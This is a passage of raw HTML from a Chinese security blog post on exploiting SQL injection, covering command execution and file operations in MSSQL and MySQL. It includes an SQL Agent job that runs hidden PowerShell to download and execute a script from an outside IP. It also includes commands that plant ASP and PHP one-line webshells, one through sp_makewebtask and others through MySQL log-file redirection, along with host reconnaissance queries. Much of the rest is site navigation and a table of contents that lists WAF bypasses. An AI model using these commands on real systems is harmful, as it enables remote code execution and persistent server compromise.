class="operator">=</span> N<span class="string">&#x27;powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;&#x27;http://192.168.214.129:80/a&#x27;&#x27;))&quot;&#x27;</span>, <span class="variable">@retry</span>_attempts <span class="operator">=</span> <span class="number">1</span>, <span class="variable">@retry</span>_interval <span class="operator">=</span> <span class="number">5</span> ;<span class="keyword">EXEC</span> dbo.sp_add_jobserver <span class="variable">@job</span>_name <span class="operator">=</span> N<span class="string">&#x27;test_powershell_job1&#x27;</span>; <span class="keyword">EXEC</span> dbo.sp_start_job N<span class="string">&#x27;test_powershell_job1&#x27;</span>;</span><br></pre></td></tr></table></figure>
<h4 id="0x03-文件操作"><a href="#0x03-文件操作" class="headerlink" title="0x03 文件操作"></a>0x03 文件操作</h4><p>1、判断文件是否存在</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#返回<span class="number">0</span>表示不存在，返回<span class="number">1</span>表示存在</span><br><span class="line"><span class="keyword">exec</span> xp_fileexist &quot;c:\\users\\public\\test.txt&quot;</span><br></pre></td></tr></table></figure>
<p>2、列目录</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#第一个参数表示要查看的文件夹，第二个参数表示递归层数，第三个参数表示展示的内容包括文件。</span><br><span class="line"><span class="keyword">exec</span> xp_subdirs &quot;C:\Users\Administrator\&quot;,<span class="number">2</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>3、写文件</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#开启Web Assistant Procedures</span><br><span class="line"><span class="keyword">exec</span> sp_configure <span class="string">&#x27;Web Assistant Procedures&#x27;</span>,<span class="number">1</span>;RECONFIGURE;</span><br><span class="line"><span class="keyword">exec</span> sp_makewebtask <span class="string">&#x27;c:\www\testwr.asp&#x27;</span>,<span class="string">&#x27;select&#x27;&#x27;&lt;%execute(request(&#x27;</span>ss<span class="string">&#x27;))%&gt;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>4、创建目录</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">exec</span> xp_create_subdir <span class="string">&#x27;D:\test&#x27;</span></span><br></pre></td></tr></table></figure>
<h4 id="0x04-信息获取"><a href="#0x04-信息获取" class="headerlink" title="0x04 信息获取"></a>0x04 信息获取</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">exec</span> xp_getnetname			<span class="operator">/</span><span class="operator">/</span>计算机名</span><br><span class="line"><span class="keyword">exec</span> xp_msver						<span class="operator">/</span><span class="operator">/</span>系统信息</span><br><span class="line"><span class="keyword">exec</span> xp_fixeddrives			<span class="operator">/</span><span class="operator">/</span>驱动器信息</span><br><span class="line"><span class="keyword">select</span> default_domain() <span class="keyword">as</span> mydomain;		<span class="operator">/</span><span class="operator">/</span>获取域名</span><br></pre></td></tr></table></figure>
<h3 id="2、MYSQL"><a href="#2、MYSQL" class="headerlink" title="2、MYSQL"></a>2、MYSQL</h3><p>在高版本的mysql中，一般默认配置了–secure_file_priv为null限制了文件写入，这种情况就需要通过general_log_file/show_query_log_file来尝试写文件。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#general_log_file</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log<span class="operator">=</span><span class="string">&#x27;on&#x27;</span>;</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file<span class="operator">=</span><span class="string">&#x27;D:/phpStudy/WWW/1.php&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php assert($_POST[1]);?&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log<span class="operator">=</span><span class="string">&#x27;off&#x27;</span>; <span class="operator">/</span><span class="operator">/</span>切记关闭</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#show_query_log_file</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> show_query_log<span class="operator">=</span><span class="string">&#x27;on&#x27;</span>;</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> show_query_log_file<span class="operator">=</span><span class="string">&#x27;D:\\phpStudy\\WWW\\1.php&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> sleep(<span class="number">15</span>),<span class="string">&#x27;&lt;?php assert($_POST[1]);?&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> show_query_log<span class="operator">=</span><span class="string">&#x27;off&#x27;</span>; <span class="operator">/</span><span class="operator">/</span>切记关闭</span><br></pre></td></tr></table></figure>

</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">jasson</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://j-jasson2.github.io/2020/09/02/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E9%87%8D%E6%96%B0%E5%AD%A6%E4%B9%A0/">https://j-jasson2.github.io/2020/09/02/sql注入之重新学习/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://j-jasson2.github.io" target="_blank">jasson个人博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%9B%B2%E6%B3%A8/">盲注</a><a class="post-meta__tags" href="/tags/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a><a class="post-meta__tags" href="/tags/%E6%98%BE%E9%94%99%E6%B3%A8%E5%85%A5/">显错注入</a><a class="post-meta__tags" href="/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">报错注入</a><a class="post-meta__tags" href="/tags/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/">宽字节注入</a></div><div class="post_share"><div class="social-share" data-image="/images/sql.jpeg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/09/30/Windows%E6%90%AD%E5%BB%BAweblogic%E7%8E%AF%E5%A2%83/"><img class="prev-cover" src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fwww.51wendang.com%2Fpic%2F10b9ee610cba11bb1d02938e%2F5-810-jpg_6-1080-0-0-1080.jpg&amp;refer=http%3A%2F%2Fwww.51wendang.com&amp;app=2002&amp;size=f9999,10000&amp;q=a80&amp;n=0&amp;g=0n&amp;fmt=jpeg?sec=1630917022&amp;t=a4900175111cf1e7c26c7a5ed713c7af" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Windows搭建weblogic环境</div></div></a></div><div class="next-post pull-right"><a href="/2020/05/28/%E5%A6%82%E4%BD%95%E5%81%B7%E5%81%B7%E4%BA%86%E8%A7%A3%E5%A5%B3%E7%A5%9E%E2%80%94%E2%80%94ARP%E6%AF%92%E8%8D%AF/"><img class="next-cover" src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fwww.51wendang.com%2Fpic%2Fc300ace510021256dc6dba05%2F1-810-jpg_6-1080-0-0-1080.jpg&amp;refer=http%3A%2F%2Fwww.51wendang.com&amp;app=2002&amp;size=f9999,10000&amp;q=a80&amp;n=0&amp;g=0n&amp;fmt=jpeg?sec=1630915883&amp;t=937aa034e18c55ac26f722976f6d62cd" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">如何偷偷了解女神——ARP毒药攻击</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2020/03/08/SQL注入全方位利用之显错注入/" title="SQL注入全方位利用之显错注入"><img class="cover" src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimg.shangdixinxi.com%2Fup%2Finfo%2F202006%2F20200604170532028792.png&refer=http%3A%2F%2Fimg.shangdixinxi.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1630916300&t=5efb5b64bc17ac6be7c880a5fa3db56b" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-03-08</div><div class="title">SQL注入全方位利用之显错注入</div></div></a></div><div><a href="/2020/03/02/实例挖掘sql注入显错注入漏洞/" title="花几分钟找个上市公司的SQL注入漏洞"><img class="cover" src="/images/pasted-36.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-03-02</div><div class="title">花几分钟找个上市公司的SQL注入漏洞</div></div></a></div><div><a href="/2020/05/01/极易上手的报错注入/" title="极易上手的报错注入"><img class="cover" src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimg2018.cnblogs.com%2Fblog%2F1579399%2F201907%2F1579399-20190717003510359-570355042.png&refer=http%3A%2F%2Fimg2018.cnblogs.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1630916535&t=757f4c39d3a5884249a1291b70cde3b7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-05-01</div><div class="title">极易上手的报错注入</div></div></a></div><div><a href="/2020/05/23/MySQL数据库的dnslog注入/" title="MySQL数据库的dnslog注入"><img class="cover" src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fupload-images.jianshu.io%2Fupload_images%2F20428239-e2a9abb837deef3e.png&refer=http%3A%2F%2Fupload-images.jianshu.io&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1630915755&t=4e5de1dc3865a304f901e8b162c2a111" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-05-23</div><div class="title">MySQL数据库的dnslog注入</div></div></a></div><div><a href="/2021/02/02/MSSQL数据库注入全方位利用/" title="MSSQL数据库注入全方位利用"><img class="cover" src="https://p5.ssl.qhimg.com/t0181df866952842a55.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-02-02</div><div class="title">MSSQL数据库注入全方位利用</div></div></a></div><div><a href="/2021/02/02/Oracle数据库注入总结/" title="Oracle数据库注入全方位利用总结(渗透必备)"><img class="cover" src="/images/oracle.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-02-02</div><div class="title">Oracle数据库注入全方位利用总结(渗透必备)</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Finews.gtimg.com%2Fnewsapp_match%2F0%2F12039801160%2F0.jpg&amp;refer=http%3A%2F%2Finews.gtimg.com&amp;app=2002&amp;size=f9999,10000&amp;q=a80&amp;n=0&amp;g=0n&amp;fmt=jpeg?sec=1630728108&amp;t=1576409e5f212dd7279b9a1c880c7086" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">jasson</div><div class="author-info__description">专注于Web、内网渗透、红蓝攻防、代码审计，分享知识，分享生活。</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">28</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">62</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/j-jasson2"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">概念：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.2.</span> <span class="toc-text">SQL注入的条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%85%B7%E4%BD%93%E6%B5%81%E7%A8%8B"><span class="toc-number">1.3.</span> <span class="toc-text">判断是否存在SQL注入的具体流程:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E5%88%86%E7%B1%BB"><span class="toc-number">1.4.</span> <span class="toc-text">SQL注入分类</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%98%BE%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.4.1.</span> <span class="toc-text">显错注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.4.2.</span> <span class="toc-text">报错注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.5.</span> <span class="toc-text">盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.5.1.</span> <span class="toc-text">布尔盲注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BB%B6%E6%97%B6%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.5.2.</span> <span class="toc-text">延时盲注</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">1.6.</span> <span class="toc-text">宽字节注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E5%85%B7%E4%BD%93%E8%A7%A3%E6%9E%90%E8%BF%87%E7%A8%8B"><span class="toc-number">1.6.1.</span> <span class="toc-text">宽字节注入具体解析过程:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B%E6%BC%94%E7%A4%BA%EF%BC%9A"><span class="toc-number">1.6.2.</span> <span class="toc-text">实例演示：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%A7%E7%94%A8dnslog%E8%BF%9B%E8%A1%8CSQL%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">巧用dnslog进行SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Dnslog"><span class="toc-number">2.1.</span> <span class="toc-text">Dnslog</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Load-file-%E5%87%BD%E6%95%B0"><span class="toc-number">2.2.</span> <span class="toc-text">Load_file()函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UNC%E8%B7%AF%E5%BE%84"><span class="toc-number">2.3.</span> <span class="toc-text">UNC路径</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Dnslog%E6%B3%A8%E5%85%A5%E5%AE%9E%E4%BE%8B%E6%BC%94%E7%A4%BA"><span class="toc-number">2.4.</span> <span class="toc-text">Dnslog注入实例演示</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E5%86%99%E5%85%A5webshell"><span class="toc-number">3.</span> <span class="toc-text">SQL注入写入webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Webshell"><span class="toc-number">3.1.</span> <span class="toc-text">Webshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#out-file-amp-dump-file"><span class="toc-number">3.2.</span> <span class="toc-text">out_file&amp;dump_file</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87waf"><span class="toc-number">4.</span> <span class="toc-text">SQL注入如何绕过waf</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">4.0.1.</span> <span class="toc-text">1、大小写绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">4.0.2.</span> <span class="toc-text">2、双写绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E3%80%81%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">4.0.3.</span> <span class="toc-text">3、编码绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4%E3%80%81%E5%9F%BA%E6%9C%AC%E7%AC%A6%E5%8F%B7%E6%9B%BF%E6%8D%A2"><span class="toc-number">4.0.4.</span> <span class="toc-text">4、基本符号替换</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5%E3%80%81%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E6%9B%BF%E6%8D%A2%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87"><span class="toc-number">4.0.5.</span> <span class="toc-text">5、报错注入替换函数绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6%E3%80%81%E5%85%B6%E4%BB%96%E7%AD%89%E4%BB%B7%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87"><span class="toc-number">4.0.6.</span> <span class="toc-text">6、其他等价函数绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7%E3%80%81%E5%86%85%E8%81%94%E6%B3%A8%E9%87%8A%E9%85%8D%E5%90%88%E6%B3%A8%E9%87%8A%E7%BB%95%E8%BF%87"><span class="toc-number">4.0.7.</span> <span class="toc-text">7、内联注释配合注释绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8%E3%80%81-0a%E6%8D%A2%E8%A1%8C%E8%B7%B3%E5%87%BA%E5%8D%95%E8%A1%8C%E6%B3%A8%E9%87%8A%E7%BB%95%E8%BF%87"><span class="toc-number">4.0.8.</span> <span class="toc-text">8、%0a换行跳出单行注释绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9%E3%80%81%E5%88%A9%E7%94%A8%E4%B8%80%E4%BA%9B%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E7%BC%BA%E9%99%B7"><span class="toc-number">4.0.9.</span> <span class="toc-text">9、利用一些中间件的缺陷</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#10%E3%80%81%E6%9B%B4%E6%8D%A2%E4%BC%A0%E5%8F%82%E6%96%B9%E5%BC%8F%E7%BB%95%E8%BF%87"><span class="toc-number">4.0.10.</span> <span class="toc-text">10、更换传参方式绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#11%E3%80%81%E5%88%A9%E7%94%A8%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96%E6%96%B9%E5%BC%8F%E7%9A%84%E7%BC%BA%E9%99%B7%E8%BF%9B%E8%A1%8C%E7%BB%95%E8%BF%87"><span class="toc-number">4.0.11.</span> <span class="toc-text">11、利用数据提取方式的缺陷进行绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#12%E3%80%81%E8%84%8F%E6%95%B0%E6%8D%AE%E7%BB%95%E8%BF%87"><span class="toc-number">4.0.12.</span> <span class="toc-text">12、脏数据绕过</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="toc-number">4.1.</span> <span class="toc-text">SQL注入实战渗透测试</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E7%B1%BB%E5%9E%8B%E7%9A%84SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">5.</span> <span class="toc-text">其他类型的SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E6%90%9C%E7%B4%A2%E6%A1%86%E6%B3%A8%E5%85%A5"><span class="toc-number">5.1.</span> <span class="toc-text">1、搜索框注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81header%E5%A4%B4%E9%83%A8%E6%B3%A8%E5%85%A5"><span class="toc-number">5.2.</span> <span class="toc-text">2、header头部注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8"><span class="toc-number">6.</span> <span class="toc-text">SQL注入利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81MSSQL"><span class="toc-number">6.1.</span> <span class="toc-text">1、MSSQL</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x01-%E2%80%93os-shell"><span class="toc-number">6.1.1.</span> <span class="toc-text">0x01 –os-shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x02-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">6.1.2.</span> <span class="toc-text">0x02 命令执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x03-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C"><span class="toc-number">6.1.3.</span> <span class="toc-text">0x03 文件操作</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x04-%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96"><span class="toc-number">6.1.4.</span> <span class="toc-text">0x04 信息获取</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81MYSQL"><span class="toc-number">6.2.</span> <span class="toc-text">2、MYSQL</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/08/07/Nginx%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E4%B9%8Badd_header%E8%A2%AB%E8%A6%86%E7%9B%96/" title="Nginx中间件漏洞之add_header被覆盖"><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fupload-images.jianshu.io%2Fupload_images%2F3778244-65c62b2e2775b20a.png%3FimageMogr2%2Fauto-orient%2Fstrip%257CimageView2%2F2%2Fw%2F1240&amp;refer=http%3A%2F%2Fupload-images.jianshu.io&amp;app=2002&amp;size=f9999,10000&amp;q=a80&amp;n=0&amp;g=0n&amp;fmt=jpeg?sec=1630941831&amp;t=6d3fe55cc7cb43085f42e676981de631" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Nginx中间件漏洞之add_header被覆盖"/></a><div class="content"><a class="title" href="/2021/08/07/Nginx%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E4%B9%8Badd_header%E8%A2%AB%E8%A6%86%E7%9B%96/" title="Nginx中间件漏洞之add_header被覆盖">Nginx中间件漏洞之add_header被覆盖</a><time datetime="2021-08-07T01:45:41.000Z" title="发表于 2021-08-07 09:45:41">2021-08-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/08/06/Nginx%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E4%B9%8B%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/" title="Nginx中间件漏洞之目录穿越"><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fupload-images.jianshu.io%2Fupload_images%2F3778244-65c62b2e2775b20a.png%3FimageMogr2%2Fauto-orient%2Fstrip%257CimageView2%2F2%2Fw%2F1240&amp;refer=http%3A%2F%2Fupload-images.jianshu.io&amp;app=2002&amp;size=f9999,10000&amp;q=a80&amp;n=0&amp;g=0n&amp;fmt=jpeg?sec=1630941831&amp;t=6d3fe55cc7cb43085f42e676981de631" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Nginx中间件漏洞之目录穿越"/></a><div class="content"><a class="title" href="/2021/08/06/Nginx%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E4%B9%8B%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/" title="Nginx中间件漏洞之目录穿越">Nginx中间件漏洞之目录穿越</a><time datetime="2021-08-06T01:45:41.000Z" title="发表于 2021-08-06 09:45:41">2021-08-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/08/05/Nginx%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E4%B9%8BCRLF%E6%B3%A8%E5%85%A5/" title="Nginx中间件漏洞之CRLF注入"><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fupload-images.jianshu.io%2Fupload_images%2F3778244-65c62b2e2775b20a.png%3FimageMogr2%2Fauto-orient%2Fstrip%257CimageView2%2F2%2Fw%2F1240&amp;refer=http%3A%2F%2Fupload-images.jianshu.io&amp;app=2002&amp;size=f9999,10000&amp;q=a80&amp;n=0&amp;g=0n&amp;fmt=jpeg?sec=1630941831&amp;t=6d3fe55cc7cb43085f42e676981de631" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Nginx中间件漏洞之CRLF注入"/></a><div class="content"><a class="title" href="/2021/08/05/Nginx%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E4%B9%8BCRLF%E6%B3%A8%E5%85%A5/" title="Nginx中间件漏洞之CRLF注入">Nginx中间件漏洞之CRLF注入</a><time datetime="2021-08-05T01:45:41.000Z" title="发表于 2021-08-05 09:45:41">2021-08-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/08/03/%E6%9F%90cms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1RCE&amp;%E8%89%B0%E9%9A%BEbypass(%E6%80%9D%E8%B7%AF%E6%B8%85%E5%A5%87)/" title="某cms代码审计RCE&amp;艰难bypass(思路清奇)"><img src="https://img0.baidu.com/it/u=751296986,1439230770&amp;fm=253&amp;fmt=auto&amp;app=120&amp;f=JPEG?w=650&amp;h=407" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="某cms代码审计RCE&amp;艰难bypass(思路清奇)"/></a><div class="content"><a class="title" href="/2021/08/03/%E6%9F%90cms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1RCE&amp;%E8%89%B0%E9%9A%BEbypass(%E6%80%9D%E8%B7%AF%E6%B8%85%E5%A5%87)/" title="某cms代码审计RCE&amp;艰难bypass(思路清奇)">某cms代码审计RCE&amp;艰难bypass(思路清奇)</a><time datetime="2021-08-03T08:20:43.038Z" title="发表于 2021-08-03 16:20:43">2021-08-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/08/01/Oracle%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" title="Oracle数据库注入环境搭建"><img src="https://img0.baidu.com/it/u=3845303080,3279446310&amp;fm=26&amp;fmt=auto&amp;gp=0.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Oracle数据库注入环境搭建"/></a><div class="content"><a class="title" href="/2021/08/01/Oracle%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" title="Oracle数据库注入环境搭建">Oracle数据库注入环境搭建</a><time datetime="2021-08-01T02:00:00.000Z" title="发表于 2021-08-01 